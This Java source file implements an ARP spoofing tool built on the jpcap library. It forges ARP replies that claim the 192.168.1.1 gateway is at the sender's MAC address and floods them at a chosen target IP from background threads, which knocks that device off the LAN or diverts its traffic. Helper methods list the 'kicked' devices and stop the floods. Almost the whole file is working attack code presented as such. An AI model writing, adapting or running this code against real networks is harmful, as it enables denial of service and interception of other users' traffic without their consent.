package com.net;
import inet.ipaddr.MACAddressString;
import inet.ipaddr.mac.MACAddress;
import jpcap.JpcapCaptor;
import jpcap.NetworkInterface;
import jpcap.JpcapSender;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import java.net.InetAddress;
import java.util.ArrayList;

import static java.lang.System.out;

class SpoffingObj
{
    String ip;
    int id;
    String mac;
    Boolean status = false;
    SpoffingObj(String ip)
    {
        this.ip = ip;
    }
}
public class spoofing
{
    static int numberOfKickOff = 0;
    static ArrayList<SpoffingObj> SpoffingArr = new ArrayList<>();
    static ARPPacket arpPacket = new ARPPacket();
    static JpcapSender sender;


    static  NetworkInterface  getDeviceInterface(String select)
    {
        // Chose the interface in  the new jpcap by comparing name
        try
        {
            NetworkInterface[] networkInterfaces = JpcapCaptor.getDeviceList();
            for (NetworkInterface device : networkInterfaces)
                if(device.name.equals(select))
                    return device;
        }
        catch (Exception e)
        {
            System.out.println("in debug" + e);
        }
        return null;
    }


    static int attack(String targetIp, String select)
    {
        try
        {
            //WE ARE BUILDING A  ARP PACKET USING TRADITION INFORMATION
            byte[] hardwareAddress = java.net.NetworkInterface.getByInetAddress(InetAddress.getByName(scan.getMyIpAddress())).getHardwareAddress();
            String getMacAdrr = scan.getMacAddressShell(targetIp);
            MACAddressString string = new MACAddressString(getMacAdrr);
            MACAddress macAddress = string.toAddress();
            byte [] targetAdrr = macAddress.getBytes();
            NetworkInterface networkInterface = getDeviceInterface(select);
            sender = JpcapSender.openDevice(networkInterface);
            arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
            arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
            arpPacket.operation = ARPPacket.ARP_REPLY;
            arpPacket.hlen = 6;
            arpPacket.plen = 4;
            arpPacket.sender_hardaddr = hardwareAddress;
            arpPacket.sender_protoaddr = InetAddress.getByName("192.168.1.1").getAddress();
            arpPacket.target_hardaddr = targetAdrr;
            arpPacket.target_protoaddr = InetAddress.getByName(targetIp).getAddress();
            EthernetPacket ether = new EthernetPacket();
            ether.dst_mac = arpPacket.target_hardaddr;
            ether.src_mac = arpPacket.sender_hardaddr;
            ether.frametype = EthernetPacket.ETHERTYPE_ARP;
            arpPacket.datalink = ether;
            System.out.println(arpPacket);


            SpoffingObj user = new SpoffingObj(targetIp);
            user.id = numberOfKickOff;
            numberOfKickOff++;
            user.mac = getMacAdrr;
            user.status = true;
            System.out.println(1);
            SpoffingArr.add(user);

            System.out.println(2);

            kickOffClass obj = new kickOffClass(user.id);
            obj.start();
        }
        catch (Exception e)
        {
            System.out.println("Error in arp request :" + e);
        }
        return 1;
    }


    static void showAllKickedDevice()
    {
        out.println("--------------------------------------------------------------------------------");
        out.println("| Device ID                      | Device IP            | Device Mac Address   |");
        out.println("--------------------------------------------------------------------------------");

        for(SpoffingObj obj : SpoffingArr)
        {
            out.println("| " + String.format("%-30s", obj.id) + " | " + String.format("%-20s", obj.ip) + " | " + String.format("%-20s", obj.mac) + " |");
            out.println("--------------------------------------------------------------------------------");
        }
    }


    static void connectDevice(int id)
    {
        SpoffingArr.get(id).status = false;
        numberOfKickOff--;
    }


    static void stopAllThred()
    {
        for(SpoffingObj obj : SpoffingArr)
            obj.status = false;
    }

    public static void help()
    {

    }
}


class kickOffClass extends Thread
{
    int id;
    kickOffClass(int id)
    {
        this.id = id;
    }
    public void run()
    {
        try
        {
            System.out.println("Test " + spoofing.SpoffingArr.get(id).status);
            while (spoofing.SpoffingArr.get(id).status)
                spoofing.sender.sendPacket(spoofing.arpPacket);
            spoofing.SpoffingArr.remove(id);
            if(spoofing.SpoffingArr.size() >= id)
                for (int i = id; i < spoofing.SpoffingArr.size(); i++)
                    spoofing.SpoffingArr.get(i).id = i;

        }
        catch (Exception ex)
        {
            System.out.println("Error in Thread KickOff class" + ex);
        }
    }
}